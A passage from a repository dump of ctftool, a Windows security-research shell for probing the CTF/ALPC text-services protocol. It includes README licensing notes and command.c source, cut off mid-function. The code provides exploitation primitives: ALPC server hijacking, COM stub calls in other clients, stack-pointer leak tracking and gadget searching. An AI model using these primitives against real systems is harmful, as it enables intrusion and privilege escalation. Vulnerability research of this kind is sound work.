early as Windows 98 and\r\nNT4 would use CTF if you installed Microsoft Office.\r\n\r\n`ctftool` supports Windows 7 and later on x86 and x64, but earlier versions and\r\nother platforms *could* be supported, and contributions would be appreciated.\r\n\r\n## Acronym\r\n\r\nMicrosoft doesn't document what CTF stands for, it's not explained in any\r\nof the Text Services documentation, SDK samples, symbol names, header files,\r\nor anywhere else. My theory is it's from `CTextFramework`, what you might name\r\nthe class in [hungarian notation](http://web.mst.edu/~cpp/common/hungarian.html).\r\n\r\n> There are some websites that claim `ctfmon` has something to do with Clear\r\n> Type Fonts or the Azure Collaborative Translation Framework. They're mistaken.\r\n\r\n> Update: [Jake Nelson](https://twitter.com/JakeNelsonMN/status/1161513319049703424) finds\r\n> evidence for \"[Common Text Framework](https://patents.google.com/patent/US20040150670#P-0091)\"\r\n\r\n## Authors\r\n\r\nTavis Ormandy <taviso@gmail.com>\r\n\r\n## License\r\n\r\nAll original code is Apache 2.0, See LICENSE file for details.\r\n\r\nThe following components are imported third party projects.\r\n\r\n* [pe-parse](https://github.com/trailofbits/pe-parse), by Andrew Ruef et al.\r\n  * pe-parse is used to implement a `GetProcAddress()` for 64-bit modules from a\r\n    32-bit process. This is used in the `symbol` command, and allows the same\r\n    binary to work on x64 and x86.\r\n* [wineditline](http://mingweditline.sourceforge.net/), by Paolo Tosco.\r\n  * wineditline is used to implement user friendly command-line input and\r\n    history editing.\r\n* [dynamorio](https://www.dynamorio.org/), by Derek Bruening et al.\r\n  * I borrowed some of the prototypes and type definitions from DR.\r\n* [ntdll.h](http://www.zezula.net/en/prog/lpc.html), by Ladislav Zezula.\r\n  * Ladislav collected some structure definitions and prototoypes from\r\n    various WDK, DDK, SDK releases into one convenient file.\r\n"
        },
        {
          "name": "command.c",
          "type": "blob",
          "size": 58.2978515625,
          "content": "#define WIN32_LEAN_AND_MEAN\r\n#define WIN32_NO_STATUS\r\n#include <windows.h>\r\n#include <winternl.h>\r\n#include <stdio.h>\r\n#include <stdlib.h>\r\n#include <stdbool.h>\r\n#include <tlhelp32.h>\r\n#include <psapi.h>\r\n#include <assert.h>\r\n#include <objbase.h>\r\n#include <sddl.h>\r\n#include <msctf.h>\r\n#include <shlwapi.h>\r\n#include <string.h>\r\n#include <shellapi.h>\r\n#undef WIN32_NO_STATUS\r\n#include <ntstatus.h>\r\n\r\n#include \"ntdll.h\"\r\n#include \"ntalpctyp.h\"\r\n#include \"ntalpc.h\"\r\n#include \"wineditline/src/editline/readline.h\"\r\n\r\n#include \"ctfinternal.h\"\r\n#include \"ctftool.h\"\r\n#include \"marshal.h\"\r\n#include \"util.h\"\r\n#include \"commanddoc.h\"\r\n#include \"messages.h\"\r\n#include \"winutil.h\"\r\n#include \"command.h\"\r\n\r\n#pragma warning(disable: 4090 6387 28159 28278)\r\n\r\nUINT64 DefaultThread;\r\nUINT64 DefaultStub;\r\nUINT64 RepeatDelay;\r\nHANDLE PortHandle;\r\nHWND MessageWindow;\r\nUINT64 LeakedStackPointer;\r\nUINT64 LastModuleBase;\r\nUINT64 LastSymbolOffset;\r\nULONG NumStubs;\r\nSTUB_RECORD StubRecords[MAX_STUBS];\r\nULONG CountMarshalParams;\r\nULONGLONG LastCommandResult;\r\nULONGLONG LastRegistryValue;\r\nULONG CurrentMarshalParam;\r\nPCTF_MARSHAL_PARAM MarshalParams;\r\nUINT64 ClientThreadId;\r\nUINT64 ClientFlags;\r\nULONG NonInteractive;\r\nUINT64 LastGadget;\r\nUINT64 LastSectionResult;\r\nULONGLONG UserRegisters[6];\r\n\r\nCOMMAND_HANDLER CommandHandlers[] = {\r\n    { \"help\", 0, HelpDoc, \"List available commands.\", HelpHandler },\r\n    { \"exit\", 0, ExitDoc, \"Exit the shell.\", ExitHandler },\r\n    { \"quit\", 0, NULL, NULL, ExitHandler },\r\n    { \"q\", 0, NULL, NULL, ExitHandler },\r\n    { \"connect\", 0, ConnectDoc, \"Connect to CTF ALPC Port.\", ConnectHandler },\r\n    { \"info\", 0, InfoDoc, \"Query server informaiton.\", InfoHandler },\r\n    { \"scan\", 0, ScanDoc, \"Enumerate connected clients.\", ScanHandler },\r\n    { \"callstub\", 3, CallStubDoc, \"Ask a client to invoke a function.\", CallStubHandler },\r\n    { \"createstub\", 3, CreateStubDoc, \"Ask a client to instantiate CLSID.\", CreateStubHandler },\r\n    { \"hijack\", 2, HijackDoc, \"Attempt to hijack an ALPC server path.\", HijackHandler },\r\n    { \"sendinput\", 2, NULL, \"Send keystrokes to thread.\", NULL },\r\n    { \"setarg\", 1, SetArgDoc, \"Marshal a parameter.\", SetArgHandler },\r\n    { \"getarg\", 1, GetArgDoc, \"Unmarshal a parameter.\", GetArgHandler },\r\n    { \"wait\", 1, WaitDoc, \"Wait for a process and set it as the default thread.\", WaitHandler },\r\n    { \"thread\", 0, ThreadDoc, \"Set the default thread.\", ThreadHandler },\r\n    { \"sleep\", 1, SleepDoc, \"Sleep for specified milliseconds.\", SleepHandler },\r\n    { \"forget\", 0, ForgetDoc, \"Forget all known stubs.\", ForgetHandler },\r\n    { \"stack\", 0, StackDoc, \"Print the last leaked stack ptr.\", StackHandler },\r\n    { \"marshal\", 2, MarshalDoc, \"Send command with marshalled parameters.\", MarshalHandler },\r\n    { \"proxy\", 3, CallStubDoc, \"Send command with proxy parameters.\", CallStubHandler },\r\n    { \"call\", 2, CallDoc, \"Send command without appended data.\", CallHandler },\r\n    { \"window\", 0, WindowDoc, \"Create and register a message window.\", WindowHandler },\r\n    { \"patch\", 4, PatchDoc, \"Patch a marshalled parameter.\", PatchHandler },\r\n    { \"module\", 1, ModuleDoc, \"Print the base address of a module.\", ModuleHandler },\r\n    { \"module64\", 1, ModuleDoc, \"Print the base address of a 64bit module.\", ModuleHandler64 },\r\n    { \"editarg\", 1, EditArgDoc, \"Change the type of a marshalled parameter.\", EditArgHandler },\r\n    { \"symbol\", 1, SymbolDoc, \"Lookup a symbol offset from ImageBase.\", SymbolHandler },\r\n    { \"set\", 0, SetDoc, \"Change or dump various ctftool parameters.\", SetHandler },\r\n    { \"add\", 2, NULL, NULL, SetHandler },\r\n    { \"sub\", 2, NULL, NULL, SetHandler },\r\n    { \"neg\", 2, NULL, NULL, SetHandler },\r\n    { \"shl\", 2, NULL, NULL, SetHandler },\r\n    { \"shr\", 2, NULL, NULL, SetHandler },\r\n    { \"and\", 2, NULL, NULL, SetHandler },\r\n    { \"or\", 2, NULL, NULL, SetHandler },\r\n    { \"xor\", 2, NULL, NULL, SetHandler },\r\n    { \"not\", 2, NULL, NULL, SetHandler },\r\n    { \"eq\", 2, NULL, NULL, SetHandler },\r\n    { \"show\", 0, ShowDoc, \"Show the value of special variables you can use.\", ShowHandler },\r\n    { \"lock\", 0, LockDoc, \"Lock the workstation, switch to Winlogon desktop.\", LockHandler },\r\n    { \"repeat\", 2, RepeatDoc, \"Repeat a command multiple times.\", RepeatHandler },\r\n    { \"run\", 1, RunDoc, \"Run a command.\", RunHandler },\r\n    { \"script\", 1, ScriptDoc, \"Source a script file.\", ScriptHandler },\r\n    { \"print\", 0, NULL, \"Print a string.\", PrintHandler },\r\n    { \"echo\", 1, NULL, NULL, PrintHandler },\r\n    { \"consent\", 0, ConsentDoc, \"Invoke the UAC consent dialog.\", ConsentHandler },\r\n    { \"reg\", 3, RegDoc, \"Lookup a DWORD in the registry.\", RegHandler },\r\n    { \"gadget\", 2, GadgetDoc, \"Find the offset of a pattern in a file.\", GadgetHandler },\r\n    { \"section\", 3, SectionDoc, \"Lookup property of PE section.\", SectionHandler },\r\n};\r\n\r\nint CompareFirst(PCHAR a, PCHAR *b)\r\n{\r\n    return strcmpi(a, *b);\r\n}\r\n\r\nULONGLONG DecodeIntegerParameter(PCHAR Value) {\r\n    ULONGLONG Result;\r\n    PCHAR ParseEnd;\r\n    BOOL PrintHelp;\r\n    SPECIAL_VARIABLE Variables[] = {\r\n        { \"thread\", \"The current default thread.\", DefaultThread },\r\n        { \"stubid\", \"The last created stubid.\", DefaultStub },\r\n        { \"tid\", \"The ctftool main thread id.\", GetCurrentThreadId() },\r\n        { \"pid\", \"The ctftool process id.\", GetCurrentProcessId() },\r\n        { \"sid\", \"The ctftool session id.\", NtCurrentTeb()->ProcessEnvironmentBlock->SessionId },\r\n        { \"symbol\", \"The result of the last symbol lookup.\", LastSymbolOffset },\r\n        { \"module\", \"The result of the last module lookup.\", LastModuleBase },\r\n        { \"focusthread\", \"Owner of foreground window.\", GetFocusThread() },\r\n        { \"hkl\", \"The current keyboard layout\", (DWORD)(GetKeyboardLayout(GetCurrentThreadId())) & 0xffff },\r\n        { \"r0\", \"User defined register.\", UserRegisters[0] },\r\n        { \"r1\", \"User defined register.\", UserRegisters[1] },\r\n        { \"r2\", \"User defined register.\", UserRegisters[2] },\r\n        { \"r3\", \"User defined register.\", UserRegisters[3] },\r\n        { \"r4\", \"User defined register.\", UserRegisters[4] },\r\n        { \"r5\", \"User defined register.\", UserRegisters[5] },\r\n        { \"rc\", \"Return code of last run command.\", LastCommandResult },\r\n        { \"regval\", \"The last value queried from the registry.\", LastRegistryValue },\r\n        { \"gadget\", \"Result of the last gadget found.\", LastGadget },\r\n        { \"secval\", \"Result of the last section property query.\", LastSectionResult }\r\n    };\r\n\r\n    // Check if the caller is requesting help.\r\n    PrintHelp = strcmp(Value, \"help\") == 0;\r\n\r\n    // Check if this is a \"special\" value\r\n    for (ULONG i = 0; i < _countof(Variables); i++) {\r\n        if (strcmp(Value, \"help\") == 0) {\r\n            LogMessage(stdout, \"%-20s: %s\", Variables[i].Name, Variables[i].Description);\r\n        }\r\n        if (strcmp(Value, Variables[i].Name) == 0) {\r\n            return Variables[i].Value;\r\n        }\r\n    }\r\n\r\n    // Not a special value, try to use strtoull().\r\n    Result = strtoull(Value, &ParseEnd, 0);\r\n\r\n    // If that worked, return result.\r\n    if (*ParseEnd == '\\0' || PrintHelp)\r\n        return Result;\r\n\r\n    // Failed, just use zero and print a warning.\r\n    LogMessage(stderr, \"Did not recognize %s as variable or integer, assuming zero.\", Value);\r\n\r\n    return Result;\r\n};\r\n\r\nULONG ScriptHandler(PCHAR Command, ULONG ParamCount, PCHAR *Parameters)\r\n{\r\n    FILE *ScriptFile;\r\n    PCHAR OriginalCommand;\r\n    HIST_ENTRY *Hist;\r\n    CHAR LineBuf[8192];\r\n\r\n    ScriptFile = fopen(*Parameters, \"r\");\r\n    Hist = history_get(history_length() - 1);\r\n    OriginalCommand = strdup(Hist->line);\r\n\r\n    if (ScriptFile) {\r\n        NonInteractive++;\r\n        while (fgets(LineBuf, sizeof LineBuf, ScriptFile)) {\r\n            // Save this to the history so commands can access it.\r\n            Hist = replace_history_entry(history_length() - 1, LineBuf, 0);\r\n\r\n            // Exit command in a script just exits the script.\r\n            if (DispatchCommand(LineBuf) == 0)\r\n                break;\r\n        }\r\n    } else {\r\n        LogMessage(stderr, \"failed to open file %s\", *Parameters);\r\n    }\r\n\r\n    NonInteractive--;\r\n\r\n    // Restore real history entry.\r\n    replace_history_entry(history_length() - 1, OriginalCommand, 0);\r\n    free(OriginalCommand);\r\n\r\n    return 1;\r\n}\r\n\r\nPCHAR GetOrigCommandLine(BOOL SkipCommand, ULONG SkipParameters)\r\n{\r\n    HIST_ENTRY *Hist = history_get(history_length() - 1);\r\n    PCHAR CommandLine;\r\n\r\n    // This is a hack, I just pull the command out of history.\r\n    assert(Hist != NULL);\r\n    assert(Hist->line);\r\n\r\n    CommandLine = Hist->line;\r\n\r\n    // Skip past any leading whitespace.\r\n    CommandLine += strspn(CommandLine, \" \\t\\n\");\r\n\r\n    if (SkipCommand) {\r\n        CommandLine += strcspn(CommandLine, \" \\t\\n\");\r\n        CommandLine += strspn(CommandLine, \" \\t\\n\");\r\n    }\r\n\r\n    for (ULONG i = 0; i < SkipParameters; i++) {\r\n        CommandLine += strcspn(CommandLine, \" \\t\\n\");\r\n        CommandLine += strspn(CommandLine, \" \\t\\n\");\r\n    }\r\n\r\n    return CommandLine;\r\n}\r\n\r\nULONG RunHandler(PCHAR Command, ULONG ParamCount, PCHAR *Parameters)\r\n{\r\n    STARTUPINFO StartupInfo = { sizeof StartupInfo };\r\n    PROCESS_INFORMATION ProcessInfo;\r\n    PCHAR CommandLine = GetOrigCommandLine(TRUE, 0);\r\n    PVOID OldValue;\r\n    DWORD ReturnCode;\r\n\r\n    // Disable Redirection so we get the real files.\r\n    if (Wow64DisableWow64FsRedirection(&OldValue) == false) {\r\n        LogMessage(stderr, \"Could not disable redirection.\");\r\n    }\r\n\r\n    if (CreateProcess(NULL, CommandLine, NULL, NULL, TRUE, 0, NULL, NULL, &StartupInfo, &ProcessInfo)) {\r\n        WaitForSingleObject(ProcessInfo.hProcess, INFINITE);\r\n        GetExitCodeProcess(ProcessInfo.hProcess, &ReturnCode);\r\n        CloseHandle(ProcessInfo.hProcess);\r\n        CloseHandle(ProcessInfo.hThread);\r\n\r\n        // Make result available as a variable.\r\n        LastCommandResult = ReturnCode;\r\n    } else {\r\n        LogMessage(stderr, \"Failed to create process %s.\", CommandLine);\r\n    }\r\n\r\n    // Restore Redirection.\r\n    Wow64RevertWow64FsRedirection(OldValue);\r\n\r\n    return 1;\r\n}\r\n\r\nULONG RepeatHandler(PCHAR Command, ULONG ParamCount, PCHAR *Parameters)\r\n{\r\n    HIST_ENTRY *Hist = history_get(history_length() - 1);\r\n    ULONG Count = DecodeIntegerParameter(*Parameters);\r\n    PCHAR CommandLine = GetOrigCommandLine(TRUE, 1);\r\n\r\n    for (ULONG i = 0; i < Count; i++) {\r\n        ULONG Result = DispatchCommand(CommandLine);\r\n\r\n        if (Result == 0) {\r\n            return Result;\r\n        }\r\n\r\n        // Customizable delay with the set command for debugging.\r\n        Sleep(RepeatDelay);\r\n    }\r\n    return 1;\r\n}\r\n\r\nULONG LockHandler(PCHAR Command, ULONG ParamCount, PCHAR *Parameters)\r\n{\r\n    INPUT kHotKeyInput[] = {\r\n        { INPUT_KEYBOARD, .ki = { VK_ESCAPE, .dwFlags = 0 }},\r\n        { INPUT_KEYBOARD, .ki = { VK_ESCAPE, .dwFlags = KEYEVENTF_KEYUP }},\r\n    };\r\n\r\n    LockWorkStation();\r\n\r\n    // Wait a second for the UI to draw.\r\n    Sleep(2000);\r\n\r\n    // Hit `Esc` so that the login screen gets drawn.\r\n    SendInput(_countof(kHotKeyInput), kHotKeyInput, sizeof(INPUT));\r\n    return 1;\r\n}\r\n\r\nULONG PrintHandler(PCHAR Command, ULONG ParamCount, PCHAR *Parameters)\r\n{\r\n    if (ParamCount && NonInteractive) {\r\n        fprintf(stdout, \"%s\", GetOrigCommandLine(TRUE, 0));\r\n    } else if (NonInteractive) {\r\n        fprintf(stdout, \"\\n\");\r\n    } else {\r\n        LogMessage(stdout, \"%s\", GetOrigCommandLine(TRUE, 0));\r\n    }\r\n    return 1;\r\n}\r\n\r\nULONG ShowHandler(PCHAR Command, ULONG ParamCount, PCHAR *Parameters)\r\n{\r\n    if (ParamCount) {\r\n        LogMessage(stdout, \"%#llx\", DecodeIntegerParameter(*Parameters));\r\n    } else {\r\n        DecodeIntegerParameter(\"help\");\r\n    }\r\n    return 1;\r\n}\r\n\r\nULONG SetHandler(PCHAR Command, ULONG ParamCount, PCHAR *Parameters)\r\n{\r\n    static const struct {\r\n        PUINT64 Value;\r\n        PCHAR   Name;\r\n        PCHAR   Description;\r\n    } TunableSettings[] = {\r\n        { &DefaultThread, \"default-dst-thread\", \"Destination threadid for commands.\" },\r\n        { &ClientThreadId, \"default-src-thread\", \"Source threadid for commands.\" },\r\n        { &DefaultStub, \"default-stub\", \"Default stubid for stub calls.\" },\r\n        { &ClientFlags, \"client-flags\", \"The client flags passed on connect.\" },\r\n        { &ProxyExtra1, \"proxy-extra-1\", \"Padding for proxy structure.\" },\r\n        { &ProxyExtra2, \"proxy-extra-2\", \"Padding for proxy structure.\" },\r\n        { &ProxyExtra3, \"proxy-extra-3\", \"Padding for proxy structure.\" },\r\n        { &UserRegisters[0], \"r0\", \"User register.\" },\r\n        { &UserRegisters[1], \"r1\", \"User register.\" },\r\n        { &UserRegisters[2], \"r2\", \"User register.\" },\r\n        { &UserRegisters[3], \"r3\", \"User register.\" },\r\n        { &UserRegisters[4], \"r4\", \"User register.\" },\r\n        { &UserRegisters[5], \"r5\", \"User register.\" },\r\n        #pragma warning(suppress: 4047)\r\n        { &MessageWindow, \"connect-hwnd\", \"The HWND we pass in the connect message.\" },\r\n        { &RepeatDelay, \"repeat-delay\", \"Milliseconds to pause between repeat ops.\" },\r\n    };\r\n\r\n    for (ULONG Var = 0; Var < _countof(TunableSettings); Var++) {\r\n        // If ParamCount is 2, then a value was specified.\r\n        if (ParamCount == 2 && strcmp(TunableSettings[Var].Name, *Parameters) == 0) {\r\n            if (strcmp(Command, \"set\") == 0) {\r\n                *(TunableSettings[Var].Value) = DecodeIntegerParameter(Parameters[1]);\r\n            } else if (strcmp(Command, \"add\") == 0) {\r\n                *(TunableSettings[Var].Value) += DecodeIntegerParameter(Parameters[1]);\r\n            } else if (strcmp(Command, \"sub\") == 0) {\r\n                *(TunableSettings[Var].Value) -= DecodeIntegerParameter(Parameters[1]);\r\n            } else if (strcmp(Command, \"neg\") == 0) {\r\n                *(TunableSettings[Var].Value) = -DecodeIntegerParameter(Parameters[1]);\r\n            } else if (strcmp(Command, \"and\") == 0) {\r\n                *(TunableSettings[Var].Value) &= DecodeIntegerParameter(Parameters[1]);\r\n            } else if (strcmp(Command, \"shr\") == 0) {\r\n                *(TunableSettings[Var].Value) >>= DecodeIntegerParameter(Parameters[1]);\r\n            } else if (strcmp(Command, \"shl\") == 0) {\r\n                *(TunableSettings[Var].Value) <<= DecodeIntegerParameter(Parameters[1]);\r\n            } else if (strcmp(Command, \"or\") == 0) {\r\n                *(TunableSettings[Var].Value) |= DecodeIntegerParameter(Parameters[1]);\r\n            } else if (strcmp(Command, \"xor\") == 0) {\r\n                *(TunableSettings[Var].Value) ^= DecodeIntegerParameter(Parameters[1]);\r\n            } else if (strcmp(Command, \"not\") == 0) {\r\n                *(TunableSettings[Var].Value) = ~DecodeIntegerParameter(Parameters[1]);\r\n            } else if (strcmp(Command, \"eq\") == 0) {\r\n                *(TunableSettings[Var].Value) =\r\n                    *(TunableSettings[Var].Value) == DecodeIntegerParameter(Parameters[1]);\r\n            }\r\n        }\r\n        // No value, just print.\r\n        if (ParamCount == 1 && strcmp(TunableSettings[Var].Name, *Parameters) == 0) {\r\n            LogMessage(stdout, \"%s\", TunableSettings[Var].Description);\r\n        }\r\n        // No name, print everything.\r\n        if (ParamCount == 0 || (strcmp(TunableSettings[Var].Name, *Parameters) == 0 && !NonInteractive)) {\r\n            LogMessage(stdout, \"%-20s = %#llx\", TunableSettings[Var].Name, *(TunableSettings[Var].Value));\r\n        }\r\n    }\r\n    return 1;\r\n}\r\n\r\nULONG StackHandler(PCHAR Command, ULONG ParamCount, PCHAR *Parameters)\r\n{\r\n    if (LeakedStackPointer == 0) {\r\n        LogMessage(stderr, \"No stack pointer leaked yet, marshal some parameters.\");\r\n        return 1;\r\n    }\r\n\r\n    LogMessage(stdout, \"%#llx\", LeakedStackPointer);\r\n    return 1;\r\n}\r\n\r\nULONG ExitHandler(PCHAR Command, ULONG ParamCount, PCHAR *Parameters)\r\n{\r\n    return 0;\r\n}\r\n\r\nULONG SleepHandler(PCHAR Command, ULONG ParamCount, PCHAR *Parameters)\r\n{\r\n    Sleep(DecodeIntegerParameter(*Parameters));\r\n    return 1;\r\n}\r\n\r\nULONG HelpHandler(PCHAR Command, ULONG ParamCount, PCHAR *Parameters)\r\n{\r\n    if (ParamCount == 0) {\r\n        LogMessage(stdout, \"Type `help <command>` for help with a specific command.\");\r\n        LogMessage(stdout, \"Any line beginning with # is considered a comment.\\n\");\r\n    }\r\n\r\n    for (int i = 0; i < _countof(CommandHandlers); i++) {\r\n        // List all commands.\r\n        if (ParamCount == 0 && CommandHandlers[i].Description)\r\n            LogMessage(stdout, \"%-16s- %s\", CommandHandlers[i].Command, CommandHandlers[i].Description);\r\n\r\n        // Query specific command.\r\n        if (ParamCount == 1 && stricmp(CommandHandlers[i].Command, *Parameters) == 0) {\r\n            if (CommandHandlers[i].Description) {\r\n                LogMessage(stdout, \"%s\\n\", CommandHandlers[i].Description);\r\n            } else {\r\n                LogMessage(stdout, \"%s is an alias\", *Parameters);\r\n            }\r\n\r\n            // Show detailed help.\r\n            if (CommandHandlers[i].LongDescription)\r\n                LogMessage(stdout, \"%s\", CommandHandlers[i].LongDescription);\r\n\r\n            // No need to keep searching.\r\n            break;\r\n        }\r\n    }\r\n\r\n    if (PortHandle == NULL)\r\n        LogMessage(stdout, \"Most commands require a connection, see \\\"help connect\\\".\");\r\n\r\n    return 1;\r\n}\r\n\r\nULONG InfoHandler(PCHAR Commad, ULONG ParamCount, PCHAR *Parameters)\r\n{\r\n    CTF_MSGBASE Message;\r\n    HRESULT Result;\r\n\r\n    ZeroMemory(&Message, sizeof Message);\r\n\r\n    Message.Message = MSG_GETMONITORPID;\r\n    Message.SrcThreadId = ClientThreadId;\r\n\r\n    Result = SendReceivePortMessage(PortHandle,\r\n                                    &Message.Header,\r\n                                    sizeof Message,\r\n                                    NULL);\r\n    if (Result != 0) {\r\n        LogMessage(stdout, \"The command failed with error %#x\", Result);\r\n        return 1;\r\n    }\r\n\r\n    LogMessage(stdout, \"The server responded.\");\r\n    LogMessage(stdout, \"\\tMonitor PID: %u\", Message.Params[0]);\r\n    return 1;\r\n}\r\n\r\nULONG ScanHandler(PCHAR Command, ULONG ParamCount, PCHAR *Parameters)\r\n{\r\n    UINT Count = 0;\r\n    CTF_MSGBASE Message;\r\n    HRESULT Result;\r\n    HANDLE SnapshotHandle;\r\n    HWND ClientWindow;\r\n    LARGE_INTEGER Timeout = {\r\n        .QuadPart = -100000LL,\r\n    };\r\n    THREADENTRY32 ThreadData = {\r\n        .dwSize = sizeof(ThreadData),\r\n    };\r\n\r\n    SnapshotHandle = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);\r\n\r\n    if (SnapshotHandle == INVALID_HANDLE_VALUE) {\r\n        LogMessage(stderr, \"failed to create tool snapshot\");\r\n        goto cleanup;\r\n    }\r\n\r\n    if (Thread32First(SnapshotHandle, &ThreadData) == false) {\r\n        LogMessage(stderr, \"failed to query system threads\");\r\n        goto cleanup;\r\n    }\r\n\r\n    do {\r\n        ZeroMemory(&Message, sizeof Message);\r\n\r\n        // Note that nothing is stopping clients lying.\r\n        // MSG_GETCLIENTINFOEX accepts\r\n        //  [0] ThreadId\r\n        // MSG_GETCLIENTINFOEX returns\r\n        //  [0] Client Flags\r\n        //  [1] ProcessId\r\n        //  [2] GetTickCount() generated by client when registering.\r\n\r\n        Message.Message = MSG_GETCLIENTINFOEX;\r\n        Message.SrcThreadId = ClientThreadId;\r\n        Message.Params[0] = ThreadData.th32ThreadID;\r\n\r\n        Result = SendReceivePortMessage(PortHandle,\r\n                                        &Message.Header,\r\n                                        sizeof Message,\r\n                                        &Timeout);\r\n\r\n        if (Result != 0) {\r\n            LogMessage(stderr, \"failed to send message to server, giving up, %#x\", Result);\r\n            goto cleanup;\r\n        }\r\n\r\n        if (Message.Result == 0) {\r\n            PCHAR ImageName;\r\n            ULONG Flags;\r\n            HANDLE Process;\r\n\r\n            Flags = Message.Params[0];\r\n\r\n            // Ask what their HWND is.\r\n            Message.Message = MSG_GETTHREADHWND;\r\n            Message.SrcThreadId = ClientThreadId;\r\n            Message.Params[0] = ThreadData.th32ThreadID;\r\n\r\n            Result = SendReceivePortMessage(PortHandle,\r\n                                            &Message.Header,\r\n                                            sizeof Message,\r\n                                            &Timeout);\r\n\r\n            if (Result == 0 && Message.Result == 0) {\r\n                #pragma warning(suppress: 4312)\r\n                ClientWindow = (HWND) Message.Params[0];\r\n            }\r\n\r\n            // Figure out who owns this thread.\r\n            ImageName = QueryImageName(ThreadData.th32OwnerProcessID);\r\n\r\n            LogMessage(stdout, \"Client %u, Tid %4u (Flags %#04x, Hwnd %p, Pid %u, %s)\",\r\n                               Count++,\r\n                               ThreadData.th32ThreadID,\r\n                               Flags,\r\n                               ClientWindow,\r\n                               ThreadData.th32OwnerProcessID,\r\n                               ImageName);\r\n        }\r\n    } while(Thread32Next(SnapshotHandle, &ThreadData));\r\n\r\ncleanup:\r\n    if (SnapshotHandle != INVALID_HANDLE_VALUE) {\r\n        #pragma warning(suppress: 6387)\r\n        CloseHandle(SnapshotHandle);\r\n    }\r\n    return 1;\r\n}\r\n\r\nULONG ForgetHandler(PCHAR Command, ULONG ParamCount, PCHAR *Parameters)\r\n{\r\n    NumStubs = 0;\r\n    LogMessage(stdout, \"All Stubs Forgotten.\");\r\n    return 1;\r\n}\r\n\r\nULONG CreateStubHandler(PCHAR Command, ULONG ParamCount, PCHAR *Parameters)\r\n{\r\n    PCTF_MARSHAL_PARAM CreateParams;\r\n    WCHAR WideParameter[128] = {0};\r\n    PKNOWN_INTERFACE ClassName;\r\n    ULONG CreateParamCount = 4;\r\n    HRESULT Result;\r\n    UINT64 InterfaceType;\r\n    DWORD ThreadId;\r\n    GUID *Interface;\r\n    GUID ParsedClass = {0};\r\n\r\n    // createstub thread type interface\r\n    ThreadId        = DecodeIntegerParameter(Parameters[0]);\r\n    InterfaceType   = DecodeIntegerParameter(Parameters[1]);\r\n\r\n    ThreadId        = ThreadId ? ThreadId : DefaultThread;\r\n\r\n    // First see if user specified a GUID.\r\n    _snwprintf(WideParameter, _countof(WideParameter) - 1, L\"{%hs}\", Parameters[2]);\r\n\r\n    #pragma warning(suppress: 6053)\r\n    if (CLSIDFromString(WideParameter, &ParsedClass) == 0) {\r\n        LogMessage(stdout, \"parsed '%s' as a GUID\", Parameters[2]);\r\n        Interface = &ParsedClass;\r\n    } else {\r\n        ULONG NumInterfaces = _countof(KnownInterfaces);\r\n\r\n        #pragma warning(push)\r\n        #pragma warning(disable : 4090 4028)\r\n        ClassName = lfind(Parameters[2],\r\n                          KnownInterfaces,\r\n                          &NumInterfaces,\r\n                          sizeof(*KnownInterfaces),\r\n                          CompareFirst);\r\n        #pragma warning(pop)\r\n        if (ClassName) {\r\n            #pragma warning(suppress : 4090)\r\n            Interface = ClassName->Interface;\r\n        } else {\r\n            LogMessage(stderr, \"Cannot parse '%s' as a GUID or recognised interface.\", Parameters[2]);\r\n            LogMessage(stderr, \"These are the interface names I know:\");\r\n            for (int i = 0; i < NumInterfaces; i++) {\r\n                LogMessage(stderr, \"\\t%s\", KnownInterfaces[i].Name);\r\n            }\r\n            return 1;\r\n        }\r\n    }\r\n\r\n    CreateParams = MarshalParamsInsertData(NULL, CreateParamCount, 0, MARSHAL_FLAG_INPUT | MARSHAL_TYPE_INT, NULL, sizeof(UINT64), FALSE);\r\n    CreateParams = MarshalParamsInsertData(CreateParams, CreateParamCount, 1, MARSHAL_FLAG_INPUT | MARSHAL_TYPE_INT, &InterfaceType, sizeof(UINT64), FALSE);\r\n    CreateParams = MarshalParamsInsertData(CreateParams, CreateParamCount, 2, MARSHAL_FLAG_INPUT | MARSHAL_TYPE_DATA, Interface, sizeof(GUID), FALSE);\r\n    CreateParams = MarshalParamsInsertData(CreateParams, CreateParamCount, 3, MARSHAL_FLAG_OUTPUT | MARSHAL_FLAG_ARRAY | MARSHAL_TYPE_COM, NULL, sizeof(UINT64), FALSE);\r\n\r\n    Result = SendReceiveMarshalData(PortHandle,\r\n                                    MSG_CREATESTUB | MSGFLAG_DATA_APPENDED,\r\n                                    CreateParams,\r\n                                    CreateParamCount,\r\n                                    ThreadId);\r\n\r\n    if (Result != 0) {\r\n        LogMessage(stderr, \"Command failed, returned %#x\", Result);\r\n        goto cleanup;\r\n    }\r\n\r\n    LogMessage(stderr, \"Command succeeded, stub created\");\r\n\r\n    MarshalParamsDumpData(CreateParams, 3);\r\n\r\n    if (NumStubs >= MAX_STUBS) {\r\n        LogMessage(stderr, \"Sorry, ran out of stub storage space, see `help forget`.\");\r\n        goto cleanup;\r\n    }\r\n\r\n    // Remember this stub so used doesnt have to type it all in.\r\n    StubRecords[NumStubs].ThreadId = ThreadId;\r\n\r\n    // Copy over the details.\r\n    memcpy(&StubRecords[NumStubs].Stub,\r\n           MarshalDataPtr(PVOID, CreateParams, 3),\r\n           sizeof(CTF_MARSHAL_COMSTUB));\r\n\r\n    // Record the last stubid seen.\r\n    DefaultStub = StubRecords[NumStubs].Stub.StubId;\r\n\r\n    // Done saving stubs.\r\n    NumStubs++;\r\n\r\ncleanup:\r\n    MarshalParamsFree(CreateParams);\r\n    return 1;\r\n}\r\n\r\nULONG CallStubHandler(PCHAR Command, ULONG ParamCount, PCHAR *Parameters)\r\n{\r\n    DWORD ThreadId;\r\n    DWORD StubId;\r\n    DWORD FunctionNum;\r\n    HRESULT Result;\r\n    PCTF_MARSHAL_COMSTUB StubRecord;\r\n\r\n    // callstub thread id functionnum\r\n    ThreadId    = DecodeIntegerParameter(Parameters[0]);\r\n    StubId      = DecodeIntegerParameter(Parameters[1]);\r\n    FunctionNum = DecodeIntegerParameter(Parameters[2]);\r\n    StubRecord  = NULL;\r\n    ThreadId    = ThreadId ? ThreadId : DefaultThread;\r\n    StubId      = StubId ? StubId : DefaultStub;\r\n\r\n    // First search for this stub\r\n    for (int i = 0; i < NumStubs; i++) {\r\n        if (StubRecords[i].ThreadId == ThreadId\r\n         && StubRecords[i].Stub.StubId == StubId) {\r\n            StubRecord = &StubRecords[i].Stub;\r\n            break;\r\n         }\r\n    }\r\n\r\n    if (StubRecord == NULL) {\r\n        LogMessage(stderr, \"Sorry, I don't recognise stub %u for thread %u\", StubId, ThreadId);\r\n        return 1;\r\n    }\r\n\r\n    if (CurrentMarshalParam != CountMarshalParams) 